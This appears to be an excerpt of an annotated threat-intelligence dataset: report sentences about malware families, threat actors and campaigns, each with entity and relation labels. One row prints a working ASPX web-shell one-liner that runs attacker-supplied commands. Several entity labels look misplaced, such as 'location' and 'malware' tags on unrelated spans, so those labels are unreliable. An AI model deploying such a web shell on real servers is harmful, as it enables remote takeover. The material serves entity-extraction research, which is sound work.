,index,text,entities,relations,Comments,id,label,start_offset,end_offset
317,8253,This highlights how the cybercrime underground in the Middle East/North African region (covered in our paper titled Digital Souks: A Glimpse into the Middle Eastern and North African Underground) can expand their activity into areas beyond their original area of expertise.,"[{'id': 25484, 'label': 'location', 'start_offset': 80, 'end_offset': 86}, {'id': 25486, 'label': 'location', 'start_offset': 196, 'end_offset': 199}, {'id': 25487, 'label': 'malware', 'start_offset': 200, 'end_offset': 206}]",[],[],25484.0,location,80.0,86.0
318,11354,GeckoHtmlElement > (,[],[],[],,,,
319,4075,"HTShell hardcoded C&Cs     HTShell encodes a hard­-coded string, ""tp==="" with custom base64 and embeds the encoded string in the request cookies.","[{'id': 49911, 'label': 'malware', 'start_offset': 0, 'end_offset': 7}, {'id': 49912, 'label': 'malware', 'start_offset': 27, 'end_offset': 34}]",[],[],49911.0,malware,0.0,7.0
320,925,"I originally wished to determine if the new version of PClock, PClock 2, included enough improvements to compete with some of the larger ransomware malware families, such as CryptoWall, TeslaCrypt, or TorrentLocker.","[{'id': 2911, 'label': 'malware', 'start_offset': 174, 'end_offset': 184}, {'id': 2913, 'label': 'malware', 'start_offset': 201, 'end_offset': 214}, {'id': 46442, 'label': 'malware', 'start_offset': 186, 'end_offset': 196}, {'id': 46446, 'label': 'malware', 'start_offset': 63, 'end_offset': 71}, {'id': 46447, 'label': 'malware', 'start_offset': 55, 'end_offset': 61}]",[],[],2911.0,malware,174.0,184.0
321,660," As always if you have any questions, please come to the Threat & Vulnerability Discussions on our Live Community.  Version Summary  June 27, 2017:  June 27, 2017 – 1:08 PM PT  June 28, 2017 – 8:40 AM PT  June 29, 2017 - 5:00 PM PT  Sign up to receive the latest news, cyber threat intelligence and research from us  Please enter your email address!","[{'id': 46238, 'label': 'TIME', 'start_offset': 133, 'end_offset': 146}, {'id': 46241, 'label': 'TIME', 'start_offset': 177, 'end_offset': 203}, {'id': 46242, 'label': 'TIME', 'start_offset': 205, 'end_offset': 231}, {'id': 46240, 'label': 'TIME', 'start_offset': 149, 'end_offset': 175}]",[],[],46238.0,TIME,133.0,146.0
322,2495, Palo Alto Networks Next-Generation Firewall with a Threat Prevention subscription can block the attack traffic related to this vulnerability.  Palo Alto Networks Prisma Cloud can detect the presence of both CVE-2022-22965 and CVE-2022-22963 across all Compute environments.,"[{'id': 47583, 'label': 'vulnerability', 'start_offset': 208, 'end_offset': 222}, {'id': 47582, 'label': 'SOFTWARE', 'start_offset': 144, 'end_offset': 175}, {'id': 47581, 'label': 'SOFTWARE', 'start_offset': 2, 'end_offset': 69}, {'id': 47584, 'label': 'vulnerability', 'start_offset': 227, 'end_offset': 241}]",[],[],47583.0,vulnerability,208.0,222.0
323,2192, The difference between the files involves the specific video player that was dropped and executed during runtime.,[],[],[],,,,
324,1890,We mentioned Urpage as a third unnamed threat actor connected to the two.,"[{'id': 45164, 'label': 'threat-actor', 'start_offset': 13, 'end_offset': 19}]",[],[],45164.0,threat-actor,13.0,19.0
325,5196,A summary of our findings across the main DDS implementations and standard specification.,[],[],[],,,,
326,3902,"Enterprises, especially critical infrastructure establishments, must report the attack to law enforcement to help bring the attackers to justice.",[],[],[],,,,
327,521,The process of delivering malware by a URL can include various techniques.,[],[],[],,,,
328,1320,FormerFirstRAT communicates using unencrypted HTTP over port 443; the use of mismatching ports and communication protocols is not uncommon in targeted attack campaigns.,"[{'id': 3993, 'label': 'malware', 'start_offset': 0, 'end_offset': 14}, {'id': 46669, 'label': 'campaign', 'start_offset': 142, 'end_offset': 167}]","[{'id': 210, 'from_id': 46669, 'to_id': 3993, 'type': 'uses'}]",[],3993.0,malware,0.0,14.0
329,1007,"For example, the standard annual fee for Amazon Prime is $99 USD; however, with the student discount, a buyer could enjoy it for free the first six months and then renew at half price for subsequent years.","[{'id': 46509, 'label': 'identity', 'start_offset': 41, 'end_offset': 53}]",[],[],46509.0,identity,41.0,53.0
330,1703,These kinds of takedowns are the impetus for some of the most impressive developments in malware technology over the last decade.,[],[],[],,,,
331,9210,"Twenty days later, HSE continues to face IT system difficulties, causing delays in some of its services.",[],[],[],,,,
332,1438,You can use keytool or openssl tools to view the certificate information.,[],[],[],,,,
333,5413,The Asus version of the Cyclops Blink malware that we have analyzed showed some differences compared to the WatchGuard versions that have been previously discussed.,"[{'id': 51417, 'label': 'malware', 'start_offset': 24, 'end_offset': 37}, {'id': 51418, 'label': 'identity', 'start_offset': 108, 'end_offset': 118}, {'id': 51419, 'label': 'identity', 'start_offset': 4, 'end_offset': 9}]",[],[],51417.0,malware,24.0,37.0
334,4733,"In contrast to commercial surveillance vendors, who we generally observe selling a capability for the end user to operate, hack-for-hire firms conduct attacks themselves.","[{'id': 50642, 'label': 'attack-pattern', 'start_offset': 123, 'end_offset': 136}]",[],[],50642.0,attack-pattern,123.0,136.0
335,4556,"However, the 'DoS' consists only of a single GET request to the target website, not enough to be effective.","[{'id': 50366, 'label': 'attack-pattern', 'start_offset': 14, 'end_offset': 17}]",[],[],50366.0,attack-pattern,14.0,17.0
336,3486,Protux’s encrypted configuration on a public blog (note the six magnet URLs; the third is Protux’s latest configuration format),"[{'id': 10584, 'label': 'malware', 'start_offset': 0, 'end_offset': 6}, {'id': 10589, 'label': 'malware', 'start_offset': 90, 'end_offset': 96}]",[],[],10584.0,malware,0.0,6.0
337,4244,"We found more code shared among the two threat actor’s malware, as Patchwork recently used multiple Delphi malware similar to some of the Delphi malware we described before.","[{'id': 50049, 'label': 'malware', 'start_offset': 138, 'end_offset': 152}, {'id': 50050, 'label': 'malware', 'start_offset': 100, 'end_offset': 114}, {'id': 50048, 'label': 'threat-actor', 'start_offset': 67, 'end_offset': 76}]","[{'id': 904, 'from_id': 50048, 'to_id': 50050, 'type': 'uses'}, {'id': 905, 'from_id': 50049, 'to_id': 50050, 'type': 'duplicate-of'}]",[],50049.0,malware,138.0,152.0
338,1739,Especially when you get an email from someone that looks like someone you trust.,[],[],[],,,,
339,12988,The data is then exfiltrated via email to a compromised email account.,[],[],[],,,,
340,1483,They serve an important role for the majority of businesses that do not have in-house developers.,[],[],[],,,,
341,2759,The only way to fully prevent exploitation is to upgrade Bash on the system to a non-vulnerable version.  Impact,[],[],[],,,,
342,2754,"bash -c ""echo this is a test""",[],[],[],,,,
343,12906,Data was processed that shows an event occurred related to the process being detected.,[],[],[],,,,
344,1080," Sign up to receive the latest news, cyber threat intelligence and research from us  Please enter your email address!  Please mark, I'm not a robot!  ",[],[],[],,,,
345,2110,"Sign up to receive the latest news, cyber threat intelligence and research from us",[],[],[],,,,
346,791,It can also make the exploitations of heap overflows or type confusion bugs significantly more difficult.,"[{'id': 46353, 'label': 'attack-pattern', 'start_offset': 21, 'end_offset': 52}]",[],[],46353.0,attack-pattern,21.0,52.0
347,13649,"The use of cloud services allowed them to obfuscate their operations by hosting infrastructures in the services themselves, making their activities tougher to spot for forensics.","[{'id': 51737, 'label': 'Infrastucture', 'start_offset': 11, 'end_offset': 25}]",[],[],51737.0,Infrastucture,11.0,25.0
348,1100," Since each shared resource can only have a single mutex effectively protecting it, leveraging that mutex is indication that a program will be using said resource.",[],[],[],,,,
349,10784,The first thing we did was check the URL where the malicious APK file was hosted (https://egov[.]sy/mobile/egov[.]apk).,"[{'id': 32973, 'label': 'location', 'start_offset': 27, 'end_offset': 32}, {'id': 32974, 'label': 'URL', 'start_offset': 82, 'end_offset': 99}, {'id': 32975, 'label': 'location', 'start_offset': 100, 'end_offset': 106}]",[],[],32973.0,location,27.0,32.0
350,3923,"<%@ Page Language=""Jscript""%><%eval(Request.Form[""Command""],""unsafe"");%> We’ve observed that in some cases, malicious actors insert this short script to avoid detection:       Figure 1. A short script",[],[],[],,,,
351,3775, WildFire and Cortex XDR categorize all samples of supported file types as malware.,"[{'id': 49609, 'label': 'SOFTWARE', 'start_offset': 1, 'end_offset': 9}, {'id': 49610, 'label': 'SOFTWARE', 'start_offset': 14, 'end_offset': 24}]",[],[],49609.0,SOFTWARE,1.0,9.0
352,4697,This bulletin includes coordinated influence operation campaigns terminated on our platforms in Q2 2022.,"[{'id': 50581, 'label': 'TIME', 'start_offset': 96, 'end_offset': 103}]",[],[],50581.0,TIME,96.0,103.0
353,7301,"Decryption routine     Like older versions of the OceanLotus backdoor, the new version contains two main functions: one for collecting operating system information and submitting this to its malicious C&C servers and receiving additional C&C communication information, and another for the backdoor capabilities.","[{'id': 22758, 'label': 'malware', 'start_offset': 50, 'end_offset': 60}, {'id': 22760, 'label': 'location', 'start_offset': 116, 'end_offset': 119}, {'id': 22761, 'label': 'location', 'start_offset': 164, 'end_offset': 167}, {'id': 22762, 'label': 'location', 'start_offset': 213, 'end_offset': 216}, {'id': 22763, 'label': 'location', 'start_offset': 269, 'end_offset': 272}]",[],[],22758.0,malware,50.0,60.0
354,12494,We have also taken extraordinary measures beyond our actions against coordinated influence operations to protect users and stop the spread of misinformation and disinformation about the war in Ukraine online.,"[{'id': 38873, 'label': 'location', 'start_offset': 119, 'end_offset': 122}, {'id': 38874, 'label': 'malware', 'start_offset': 123, 'end_offset': 127}, {'id': 38875, 'label': 'location', 'start_offset': 157, 'end_offset': 160}, {'id': 38876, 'label': 'location', 'start_offset': 186, 'end_offset': 189}]",[],[],38873.0,location,119.0,122.0
355,2518," If you think you may have been impacted, please email unit42-investigations@paloaltonetworks.com or call (866) 4-UNIT42 to get in touch with the Unit 42 Incident Response team.","[{'id': 7555, 'label': 'EMAIL', 'start_offset': 55, 'end_offset': 97}, {'id': 47714, 'label': 'identity', 'start_offset': 146, 'end_offset': 176}]",[],[],7555.0,EMAIL,55.0,97.0
356,1001,"For example, the most popular account type, which has been bought at least 569 times, was advertised as a Microsoft’s student Windows Phone 7 and 8 developer account.","[{'id': 46504, 'label': 'identity', 'start_offset': 106, 'end_offset': 116}]",[],[],46504.0,identity,106.0,116.0
357,10829,MSG_HEARTBEAT,[],[],[],,,,
358,2182," Please mark, I'm not a robot!",[],[],[],,,,
359,1189,"In the Android ecosystem, in addition to the official IAP service by Google, there are many third-party IAP Software Development Kits (SDKs) spread around the world.","[{'id': 46584, 'label': 'identity', 'start_offset': 69, 'end_offset': 75}, {'id': 46583, 'label': 'SOFTWARE', 'start_offset': 7, 'end_offset': 14}]",[],[],46584.0,identity,69.0,75.0
360,10478,Related IOCs,[],[],[],,,,
361,646,The software is heavily used in Ukraine it appears the company’s systems may have been compromised and used to issue a malicious update to systems running the program on the morning of Jun 27th.,"[{'id': 46230, 'label': 'TIME', 'start_offset': 174, 'end_offset': 193}, {'id': 46231, 'label': 'location', 'start_offset': 32, 'end_offset': 39}]",[],[],46230.0,TIME,174.0,193.0
362,7412,Trend Micro solutions,[],[],[],,,,
363,8062,Android App: https://www.virustotal.com/gui/file/5d3ff202f20af915863eee45916412a271bae1ea3a0e20988309c16723ce4da5/detection  Android App C2: communication-shield[.]site cdsa[.]xyz,[],[],[],,,,
364,6160,Propagation,[],[],[],,,,
365,946,"Antivirus programs typically identify these apps as malware, the topic of this blog is something different and harder to detect.",[],[],[],,,,
366,3018,"If you haven’t been using it, consider using that feature.",[],[],[],,,,
367,9953,Indicators of Compromise,[],[],[],,,,
368,6556,Our initial investigation on the domains registered by Hack520 revealed that similar domains (listed below) were registered by another profile.,[],[],[],,,,
369,7112,HyperBro Malware Family,"[{'id': 22264, 'label': 'malware', 'start_offset': 0, 'end_offset': 8}]",[],[],22264.0,malware,0.0,8.0
370,2995, 6. Be Smart with Your Smart Home: Smart home is an umbrella term for a diverse set of devices that have one thing in common: they all feature some kind of internet connectivity.,[],[],[],,,,
371,7025,"The old and new SysUpdate infection chains      In December 2020, we found a sample that we identified as one belonging to the SysUpdate malware family, also named Soldier, FOCUSFJORD, and HyperSSL.","[{'id': 22026, 'label': 'location', 'start_offset': 8, 'end_offset': 11}, {'id': 22027, 'label': 'malware', 'start_offset': 16, 'end_offset': 25}, {'id': 22029, 'label': 'location', 'start_offset': 77, 'end_offset': 83}, {'id': 22030, 'label': 'location', 'start_offset': 106, 'end_offset': 109}, {'id': 22031, 'label': 'malware', 'start_offset': 127, 'end_offset': 136}, {'id': 22033, 'label': 'malware', 'start_offset': 173, 'end_offset': 183}, {'id': 22034, 'label': 'location', 'start_offset': 185, 'end_offset': 188}, {'id': 22035, 'label': 'malware', 'start_offset': 189, 'end_offset': 197}]",[],[],22026.0,location,8.0,11.0
372,9553,The attacker runs HYPERSCRAPE on their own machine to download victims’ inboxes using previously acquired credentials.,[],[],[],,,,
373,1670," With the two keys in place, the malware uses the AES algorithm to encrypt traffic using Output Feedback (OFB) mode (Picture courtesy of Wikipedia).  The output of the block cipher encryption is eXclusive OR’ed (XOR’d) with 16 bytes of ciphertext to decrypt.  Each subsequent block of ciphertext will use the previous encrypted data as the IV passed into the block cipher encryption function.",[],[],[],,,,
